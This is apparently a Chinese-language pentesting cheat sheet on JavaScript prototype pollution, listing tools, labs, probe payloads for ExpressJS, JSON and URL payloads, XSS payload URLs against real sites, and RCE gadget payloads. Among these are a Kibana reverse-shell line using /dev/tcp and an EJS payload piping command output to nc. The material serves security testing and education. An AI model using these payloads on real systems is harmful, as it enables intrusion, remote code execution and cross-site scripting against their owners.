# 原型污染

> 原型污染是一种在JavaScript中发生的漏洞类型，当修改了Object.prototype的属性时就会发生。这种风险特别高，因为JavaScript对象是动态的，我们可以在任何时候向它们添加属性。此外，由于几乎所有的JavaScript对象都继承自Object.prototype，这就构成了一个潜在的攻击向量。

## 摘要

* [工具](#工具)
* [实验室](#实验室)
* [利用](#利用)
  * [示例](#示例)
  * [手动测试](#手动测试)
  * [通过JSON输入的原型污染](#通过JSON输入的原型污染)
  * [URL中的原型污染](#URL中的原型污染)
  * [原型污染有效载荷](#原型污染有效载荷)
  * [原型污染gadgets](#原型污染gadgets)
* [参考资料](#参考资料)

## 工具

* [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder) - 帮助你找到用于原型污染利用的gadgets
* [yuske/silent-spring](https://github.com/yuske/silent-spring) - Node.js中原型污染导致远程代码执行
* [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) - Node.js核心代码和第三方NPM包中的服务器端原型污染gadgets
* [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution) - 原型污染和有用的脚本gadgets
* [portswigger/server-side-prototype-pollution](https://github.com/portswigger/server-side-prototype-pollution) - Burp Suite扩展检测原型污染漏洞
* [msrkp/PPScan](https://github.com/msrkp/PPScan)

## 实验室

* [YesWeHack Dojo - 原型污染](https://dojo-yeswehack.com/XSS/Training/Prototype-Pollution)
* [PortSwigger - 原型污染](https://portswigger.net/web-security/all-labs#prototype-pollution)

## 利用

在JavaScript中，原型允许对象从其他对象继承特性。如果攻击者能够添加或修改`Object.prototype`的属性，他们本质上可以影响所有继承自该原型的对象，可能导致各种安全风险。

```js
var myDog = new Dog();

// 指向函数 "Dog"
myDog.constructor;

// 指向 "Dog" 类定义
myDog.constructor.prototype;
myDog.__proto__;
myDog["__proto__"];
```

### 示例

* 假设一个应用程序使用一个对象来维护配置设置，如下所示：

  ```js
  let config = {
      isAdmin: false
  };
  ```

* 攻击者可能能够向`Object.prototype`添加一个`isAdmin`属性，如下所示：

  ```js
  Object.prototype.isAdmin = true;
  ```

### 手动测试

* ExpressJS: `{ "__proto__":{"parameterLimit":1}}` + GET请求中至少反射1个参数的2个参数。
* ExpressJS: `{ "__proto__":{"ignoreQueryPrefix":true}}` + `??foo=bar`
* ExpressJS: `{ "__proto__":{"allowDots":true}}` + `?foo.bar=baz`
* 更改JSON响应的填充：`{ "__proto__":{"json spaces":" "}}` + `{"foo":"bar"}`，服务器应返回 `{"foo": "bar"}`
* 修改CORS头响应：`{ "__proto__":{"exposedHeaders":["foo"]}}`，服务器应返回`Access-Control-Expose-Headers`头。
* 更改状态码：`{ "__proto__":{"status":510}}`

### 通过JSON输入的原型污染

你可以通过魔法属性`__proto__`访问任何对象的原型。
JavaScript中的`JSON.parse()`函数用于解析JSON字符串并将其转换为JavaScript对象。通常它是一个汇聚点函数，可能会发生原型污染。

```js
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

异步有效载荷用于NodeJS

```js
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=payload\"\".oastify\"\".com"
  }
}
```

### URL中的原型污染

在野外发现的URL原型污染有效载荷示例。

```ps1
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

### 原型污染利用

根据原型污染是在客户端（CSPP）还是服务器端（SSPP）执行，影响将有所不同。

* 远程命令执行：[Kibana中的RCE (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

  ```js
  .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
  .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
  ```

* 远程命令执行：[使用EJSgadgets的RCE](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)

  ```js
  {
      "__proto__": {
          "client": 1,
          "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
      }
  }
  ```

* 反射型XSS：[通过Wistia嵌入代码在www.hackerone.com上的反射型XSS - #986386](https://hackerone.com/reports/986386)

* 客户端绕过：[原型污染 - 并绕过客户端HTML消毒器](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

* 服务拒绝

### 原型污染有效载荷

```js
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```

### 原型污染gadgets

在漏洞的上下文中，“gadgets”通常指的是在攻击过程中可以被利用或使用的代码片段或功能。当我们谈论“原型污染gadgets”时，我们指的是应用程序的一个特定代码路径、函数或特性，它容易受到或可以通过原型污染攻击被利用。

要么使用[yeswehack/pp-finder](https://github.com/yeswehack/pp-finder)的部分源代码创建自己的gadgets，要么尝试使用已经发现的gadgets[yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) / [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)。


## 参考链接

- [渗透测试人员指南：原型污染攻击 - HARSH BOTHRA - 2023年1月2日](https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)
- [创造一个无污染的互联网故事 - 在野外利用客户端原型污染 - s1r1us](https://blog.s1r1us.ninja/research/PP)
- [检测服务器端原型污染 - Daniel Thatcher - 2023年2月15日](https://www.intruder.io/research/server-side-prototype-pollution)
- [利用原型污染 - Kibana中的RCE（CVE-2019-7609） - MICHAŁ BENTKOWSKI - 2019年10月30日](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [NodeJS - __proto__ & prototype污染 - HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
- [原型污染 - PortSwigger](https://portswigger.net/web-security/prototype-pollution)
- [原型污染 - Snyk](https://learn.snyk.io/lessons/prototype-pollution/javascript/)
- [原型污染和绕过客户端HTML消毒器 - MICHAŁ BENTKOWSKI - 2020年8月18日](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [原型污染及其发现地点 - BitK & SakiiR - 2023年8月14日](https://youtu.be/mwpH9DF_RDA)
- [NodeJS中的原型污染攻击 - Olivier Arteau](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)
- [NodeJS应用程序中的原型污染攻击 - Olivier Arteau - Youtube](https://youtu.be/LUsiFV3dsK8)
- [原型污染导致RCE：到处都是小工具 - Mikhail Shcherbakov](https://youtu.be/v5dq80S1WF4)
- [服务器端原型污染：如何检测和利用 - YesWeHack](https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/)
- [服务器端原型污染：无需DoS的黑箱检测 - Gareth Heyes - 2023年2月15日](https://portswigger.net/research/server-side-prototype-pollution)
- [主题演讲 | 服务器端原型污染：无需DoS的黑箱检测 - Gareth Heyes](https://youtu.be/LD-KcuKM_0M)
